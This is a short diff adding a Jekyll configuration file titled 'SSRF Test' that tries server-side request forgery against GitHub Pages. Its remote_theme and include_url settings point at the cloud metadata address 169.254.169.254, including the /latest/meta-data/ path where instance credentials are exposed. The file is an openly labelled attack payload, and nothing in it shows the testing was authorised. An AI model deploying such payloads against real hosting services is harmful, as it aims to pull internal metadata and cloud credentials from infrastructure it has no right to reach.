@@ -1,0 +1,12 @@
+title: SSRF Test
+description: Testing SSRF via GitHub Pages
+
+# Remote theme that might trigger SSRF
+remote_theme: http://169.254.169.254/theme
+
+# Plugin that might fetch URLs  
+plugins:
+  - jekyll-remote-theme
+
+# Try include from URL
+include_url: http://169.254.169.254/latest/meta-data/
